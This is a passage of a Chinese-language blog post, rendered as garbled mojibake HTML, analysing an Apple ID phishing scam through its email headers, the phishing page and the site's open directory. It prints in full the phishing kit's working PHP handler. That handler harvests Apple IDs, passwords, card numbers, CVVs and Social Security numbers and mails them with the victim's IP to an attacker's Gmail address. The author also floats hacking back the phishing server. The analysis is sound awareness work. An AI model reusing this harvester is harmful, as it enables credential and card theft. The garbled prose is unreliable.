&lt;p&gt;æœ€å¾Œçš„é‡é»å°±æ˜¯ä¿¡ä»¶ä¸­çš„é‡£é­šé€£çµäº†ï¼Œé€šå¸¸é€™å€‹é€£çµæœƒå¸¶ä½ å‰å¾€ä¸€å€‹é•·å¾—è·Ÿå®˜æ–¹ç¶²ç«™ä¸€æ¨¡ä¸€æ¨£çš„ç™»å…¥é é¢ï¼Œé¨™ä½ è¼¸å…¥å¸³è™Ÿå¯†ç¢¼ç™»å…¥ä¾†ç«Šå–ã€‚åœ¨é»é¸è¶…é€£çµä¹‹å‰ï¼Œä¸€å®šè¦å…ˆçœ‹ä¸€ä¸‹é€™å€‹é€£çµå‰å¾€çš„ä½ç½®æ˜¯ä¸æ˜¯å®˜æ–¹çš„ä½ç½®ï¼Œä¾‹å¦‚æ˜¯ Apple çš„ä¿¡ä»¶é€šå¸¸å°±æœƒæ˜¯å‰å¾€ Apple.com è‡ªå·±çš„ç¶²åŸŸåç¨±ã€‚ç•¶ç„¶æ›´è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯å‡é€ çš„ç¶²åŸŸåç¨±ï¼Œä¾‹å¦‚ä½¿ç”¨ã€ŒApp1e.comã€ä¾†å½è£æˆã€ŒApple.comã€ï¼Œä¹Ÿæ˜¯éå¸¸å¸¸è¦‹çš„ã€‚&lt;/p&gt;

&lt;p&gt;é€™å°ä¿¡ä¸­ä½¿ç”¨äº†æœ€ä¸ç”¨å¿ƒçš„ç”¨æ³•ï¼Œå°±æ˜¯ç›´æ¥æ‹¿é‡£é­šç¶²ç«™çš„ URL ä¾†ç•¶é€£çµï¼Œä¸€ä¾†é•·å¾—è·Ÿå®˜æ–¹ç¶²åŸŸæ ¹æœ¬ä¸åƒï¼ŒäºŒä¾†è½è½é•·çš„é€£çµï¼Œåˆ°åº•æ˜¯æƒ³è¦é¨™èª°é»é¸å‘¢ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&quot;ä¿¡ä»¶æ¨™é ­è—æœ‰æ”»æ“Šè€…çš„è››çµ²é¦¬è·¡&quot;&gt;ä¿¡ä»¶æ¨™é ­è—æœ‰æ”»æ“Šè€…çš„è››çµ²é¦¬è·¡&lt;/h3&gt;

&lt;p&gt;æ”¶åˆ°æƒ¡æ„éƒµä»¶ã€é‡£é­šéƒµä»¶ï¼Œä¸€å®šè¦å¥½å¥½çœ‹ä¿¡ä»¶çš„æ¨™é ­æª”ï¼ˆHeaderï¼‰ã€‚è£¡é¢é€šå¸¸å¯ä»¥çœ‹åˆ°æ”»æ“Šè€…ç™¼ä¿¡çš„ä¾†æºï¼Œä¾‹å¦‚æ˜¯è‡ªå·±æ¶è¨­çš„ç™¼ä¿¡ä¼ºæœå™¨æˆ–è€…æ˜¯ä½¿ç”¨è‚‰é›ä¾†ç™¼ä¿¡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-02.png&quot; alt=&quot;Apple ID é‡£é­šä¿¡ Header&quot; title=&quot;Apple ID é‡£é­šä¿¡ Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¿¡ä»¶æ¨™é ­æœ€é‡è¦çš„å°±æ˜¯ã€ŒReceivedã€é€™å€‹éƒ¨åˆ†ï¼Œè¦ç”±ä¸‹å¾€ä¸Šé–±è®€ã€‚å¾é€™é‚Šæˆ‘å€‘å¯ä»¥çœ‹åˆ°ä¿¡ä»¶çš„æµå‘ï¼Œå¾æ”»æ“Šç™¼èµ·è€…åˆ°ç™¼ä¿¡ä¼ºæœå™¨ï¼Œä¸­é–“ç¶“éå…¶ä»–ä¼ºæœå™¨çš„è½‰é€ï¼Œæœ€å¾Œåˆ°æ”¶åˆ°é‡£é­šä¿¡ä»¶çš„éƒµä»¶ä¼ºæœå™¨ã€‚å› æ­¤å¾æœ€ä¸‹é¢çš„ Received ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“æ”»æ“Šè€…æ˜¯å¾ã€Œselecttr@cloud.httpdns.coã€ä¾†å¯„é€ä¿¡ä»¶çš„ï¼Œå› æ­¤ cloud.httpdns.co å¾ˆæœ‰å¯èƒ½å°±æ˜¯æ”»æ“Šè€…çš„ä¼ºæœå™¨ï¼Œæˆ–è€…æ˜¯è¢«é§­ä¾†ç™¼ä¿¡çš„ä¼ºæœå™¨ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœè¦ºå¾—ä¿¡ä»¶çš„æ¨™é ­å¤ªé•·é›£ä»¥é–±è®€ï¼Œå¯ä»¥åˆ©ç”¨ Google æä¾›çš„å·¥å…·ã€Œ&lt;a href=&quot;https://toolbox.googleapps.com/apps/messageheader/&quot;&gt;Google Apps Toolbox - Messageheader&lt;/a&gt;ã€ã€‚åªè¦æŠŠä¿¡ä»¶çš„æ¨™é ­è²¼ä¸Šï¼Œä»–å°±æœƒè‡ªå‹•åˆ†æä¿¡ä»¶çš„æµå‘ï¼Œå¦‚ä¸‹åœ–ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-08.png&quot; alt=&quot;æª¢æŸ¥ä¿¡ä»¶ header&quot; title=&quot;æª¢æŸ¥ä¿¡ä»¶ header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é‡£é­šç¶²é ä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Š&quot;&gt;é‡£é­šç¶²é ï¼Œä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Šã€‚&lt;/h3&gt;

&lt;p&gt;æ¥è‘—æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹é‡£é­šé é¢ã€‚é€šå¸¸ã€Œæ­£å¸¸ã€çš„é‡£é­šé é¢éƒ½æœƒåšå¾—è·Ÿå®˜æ–¹ä¸€æ¨¡ä¸€æ¨£ï¼Œå› ç‚ºé€šå¸¸æ”»æ“Šè€…éƒ½æœƒç›´æ¥æŠŠå®˜æ–¹ç¶²ç«™ä¸Šé¢çš„ HTML ç›´æ¥ä¸‹è¼‰ä¸‹ä¾†ä¿®æ”¹ã€‚å¦‚æœæœ‰åšå¾—ä¸åƒçš„ï¼Œå°±çœŸçš„æ˜¯å¤ªä¸ç”¨å¿ƒçš„æ”»æ“Šè€…ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥çœ‹åˆ°é€™å€‹é‡£é­šé é¢åšå¾—éå¸¸åƒï¼Œä¸Šé¢è¦ä½ è¼¸å…¥å¸³è™Ÿã€å¯†ç¢¼ã€å§“åã€ç”Ÿæ—¥ã€ä¿¡ç”¨å¡è™Ÿç­‰è³‡è¨Šï¼Œéå¸¸æƒ¡åŠ£ã€‚å”¯æœ‰ç¶²å€å¯¦åœ¨æ˜¯å¤ªå‡ï¼Œå¸Œæœ›æ²’æœ‰äººçœ¼æ‹™çœŸçš„ä»¥ç‚ºé€™æ˜¯ Apple çš„ç¶²ç«™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-04.png&quot; alt=&quot;Apple ID é‡£é­šç¶²é &quot; title=&quot;Apple ID é‡£é­šç¶²é &quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç§‰æŒçš„è³‡å®‰ç ”ç©¶å“¡çš„å¥½ç¿’æ…£ï¼Œæˆ‘å€‘æŠŠç¶²å€å­ç›®éŒ„å»æ‰ï¼Œçœ‹çœ‹ç¶²ç«™çš„æ ¹ç›®éŒ„é•·ä»€éº¼æ¨£å­ï¼Œçµæœè®“äººè·Œç ´çœ¼é¡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-03.png&quot; alt=&quot;é‡£é­šç¶²é é–‹æ”¾ç›®éŒ„ç€è¦½&quot; title=&quot;é‡£é­šç¶²é é–‹æ”¾ç›®éŒ„ç€è¦½&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;é‡£é­šç¶²ç«™ä¹Ÿè«‹ä½ æ³¨é‡å®‰å…¨å•Šï¼&lt;/strong&gt;é€™å€‹ç¶²ç«™å¤§å‰Œå‰Œçš„é–‹è‘—ç›®éŒ„ç´¢å¼•ï¼Œè®“æˆ‘å€‘å¯ä»¥çœ‹åˆ°ç¶²ç«™ä¸Šçš„å„å€‹ç›®éŒ„ã€æª”æ¡ˆã€‚é™¤äº† Apple çš„é‡£é­šç¶²é ä¹‹å¤–ï¼Œç”šè‡³æœ‰é‡£é­šç¶²é çš„åŸå§‹ç¢¼ã€Œconnect-info.zipã€ï¼Œæ›´æœ‰è‘—å…¶ä»–é‡£é­šç¶²é åœ¨åŒå€‹ç«™ä¸Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-05.png&quot; alt=&quot;ç«™ä¸Šå…¶ä»–é‡£é­šé é¢&quot; title=&quot;ç«™ä¸Šå…¶ä»–é‡£é­šé é¢&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ—¢ç„¶å¯ä»¥ç€è¦½ï¼Œé‚£æˆ‘å€‘ä¾†çœ‹çœ‹é‡£é­šç¶²é çš„åŸå§‹ç¢¼å¯«å¾—æ€æ¨£ã€‚æŠ“ä¸‹ä¾†è§£é–‹ä¹‹å¾Œæœƒçœ‹åˆ°å®Œæ•´çš„é‡£é­šç¶²é ï¼Œä»¥åŠæ¥æ”¶å—é¨™äººè³‡æ–™çš„ä¸»ç¨‹å¼ã€ŒSnd.phpã€ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-06.png&quot; alt=&quot;ä¸‹è¼‰é‡£é­šç¶²é åŸå§‹ç¢¼&quot; title=&quot;ä¸‹è¼‰é‡£é­šç¶²é åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é‡£é­šç¶²é çš„ç¨‹å¼å¯«å¾—éå¸¸ç°¡å–®ï¼Œåƒ…æŠŠç¶²é ä¸Šæ¥æ”¶åˆ°çš„è¢«å®³äººè³‡æ–™ã€IPï¼Œå¯„é€åˆ°ä»–çš„ä¿¡ç®±ã€Œ justforhacke@gmail.com ã€ï¼Œå¯„é€å®Œç•¢å¾Œæœƒè‡ªå‹•å°å‘åˆ°å®˜æ–¹çš„é é¢å½è£ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140703/2014-07-03-apple-id-phishing-scam-07.png&quot; alt=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼&quot; title=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœé‡£é­šç¶²é å¯«å¾—ä¸å¥½ï¼Œç”šè‡³æˆ‘å€‘æœ‰æ©Ÿæœƒå¯ä»¥æ”»æ“Šä»–é‡£é­šç¶²é ä¸Šçš„æ¼æ´ï¼Œç›´æ¥å–å¾—ä¸»æ©Ÿçš„æ¬Šé™ï¼Œè§£æ•‘ä¸–äººã€‚å¾åŸå§‹ç¢¼æˆ‘å€‘ä¸€ç›®äº†ç„¶é‡£é­šç¶²é çš„è¡Œç‚ºã€å¯«æ³•ï¼Œä¹Ÿå¯ä»¥å°‹æ‰¾æœ‰ç„¡æ”»æ“Šçš„æ©Ÿæœƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;é‡£é­šç¶²é åŸå§‹ç¢¼å‚™ä»½&quot;&gt;é‡£é­šç¶²é åŸå§‹ç¢¼å‚™ä»½&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hostname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;gethostbyaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| AppLe VbV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple ID                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee000&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Password                    : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee001&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Full Name                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee01&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Date of Birth               : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee02&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee3&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee4&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Number Of Credit Card       : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;CVC (CVV)                   : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee6&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Expiration Date             : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee7&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee8&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Social Security Number      : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;justforhacke@gmail.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;eMailAdd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;é‡£é­šéƒµä»¶ä¸æ­»åˆ¥å†æŠŠè‡ªå·±ç•¶æˆè‚¥ç¾Šäº†&quot;&gt;é‡£é­šéƒµä»¶ä¸æ­»ï¼Œåˆ¥å†æŠŠè‡ªå·±ç•¶æˆè‚¥ç¾Šäº†ï¼&lt;/h3&gt;

